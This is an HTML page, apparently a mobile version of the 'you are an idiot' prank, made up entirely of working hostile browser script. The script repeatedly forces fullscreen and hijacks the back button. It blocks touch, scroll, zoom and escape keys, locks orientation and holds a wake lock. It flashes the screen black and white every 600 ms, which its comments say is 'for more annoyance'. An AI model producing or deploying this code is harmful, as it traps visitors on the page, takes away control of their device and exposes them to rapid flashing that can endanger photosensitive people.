<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>you are an idiot</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    width: 100%; height: 100%;
    background: white;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    overflow: hidden;
    font-family: 'Times New Roman', Times, serif;
    touch-action: none;
    -webkit-user-select: none;
    user-select: none;
    position: fixed;
    top: 0; left: 0;
  }
  body.black { background: black; }
  body.black #text { color: white; }
  body.black .face circle,
  body.black .face path { stroke: white; }
  body.black .face circle.dot { fill: white; stroke: none; }
  #text {
    font-size: clamp(32px, 8vw, 96px);
    color: black;
    margin-bottom: 48px;
    text-align: center;
    line-height: 1.1;
  }
  #faces {
    display: flex;
    gap: clamp(20px, 5vw, 64px);
    align-items: center;
  }
  .face {
    width: clamp(60px, 12vw, 120px);
    height: clamp(60px, 12vw, 120px);
  }
</style>
</head>
<body>
<div id="text">you are an idiot.</div>
<div id="faces">
  <svg class="face" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <circle cx="50" cy="50" r="45" fill="none" stroke="black" stroke-width="3.5"/>
    <circle class="dot" cx="36" cy="40" r="5.5" fill="black"/>
    <circle class="dot" cx="64" cy="40" r="5.5" fill="black"/>
    <path d="M 28 63 Q 50 82 72 63" fill="none" stroke="black" stroke-width="3.5" stroke-linecap="round"/>
  </svg>
  <svg class="face" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <circle cx="50" cy="50" r="45" fill="none" stroke="black" stroke-width="3.5"/>
    <circle class="dot" cx="36" cy="40" r="5.5" fill="black"/>
    <circle class="dot" cx="64" cy="40" r="5.5" fill="black"/>
    <path d="M 28 63 Q 50 82 72 63" fill="none" stroke="black" stroke-width="3.5" stroke-linecap="round"/>
  </svg>
  <svg class="face" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <circle cx="50" cy="50" r="45" fill="none" stroke="black" stroke-width="3.5"/>
    <circle class="dot" cx="36" cy="40" r="5.5" fill="black"/>
    <circle class="dot" cx="64" cy="40" r="5.5" fill="black"/>
    <path d="M 28 63 Q 50 82 72 63" fill="none" stroke="black" stroke-width="3.5" stroke-linecap="round"/>
  </svg>
</div>

<script>
  const el = document.documentElement;
  const body = document.body;

  // Aggressive fullscreen
  function requestFullscreen() {
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    else if (el.msRequestFullscreen) el.msRequestFullscreen();
  }

  requestFullscreen();

  // Flash black/white — fixed with higher reliability + faster flash
  let isBlack = false;
  setInterval(() => {
    isBlack = !isBlack;
    if (isBlack) {
      body.classList.add('black');
    } else {
      body.classList.remove('black');
    }
  }, 600); // Slightly faster for more annoyance

  // Re-request fullscreen constantly
  setInterval(requestFullscreen, 800);

  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      setTimeout(requestFullscreen, 100);
    }
  });
  document.addEventListener('webkitfullscreenchange', () => {
    if (!document.webkitFullscreenElement) {
      setTimeout(requestFullscreen, 100);
    }
  });

  // Block escape / back button / history
  history.pushState(null, '', location.href);
  window.addEventListener('popstate', () => {
    history.pushState(null, '', location.href);
  });

  // Prevent all default touch gestures
  document.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
  document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
  document.addEventListener('touchend', e => e.preventDefault(), { passive: false });
  document.addEventListener('gesturestart', e => e.preventDefault());
  document.addEventListener('gesturechange', e => e.preventDefault());
  document.addEventListener('gestureend', e => e.preventDefault());

  // Block scroll / zoom
  document.addEventListener('wheel', e => e.preventDefault(), { passive: false });
  document.addEventListener('scroll', () => window.scrollTo(0, 0));

  // Keep requesting on any interaction
  ['click', 'touchstart', 'mousedown'].forEach(evt => {
    document.addEventListener(evt, requestFullscreen, { passive: false });
  });

  // Wake lock
  if ('wakeLock' in navigator) {
    navigator.wakeLock.request('screen').catch(() => {});
  }

  // Try to lock orientation (works on many Android devices)
  if (screen.orientation && screen.orientation.lock) {
    screen.orientation.lock('portrait').catch(() => {
      screen.orientation.lock('landscape').catch(() => {});
    });
  }

  // Extra visibility handler
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      requestFullscreen();
    }
  });

  // Keyboard blocking (limited but helps)
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' || e.key === 'Backspace' || e.key === 'Tab') {
      e.preventDefault();
      requestFullscreen();
    }
  });
</script>
</body>
</html>
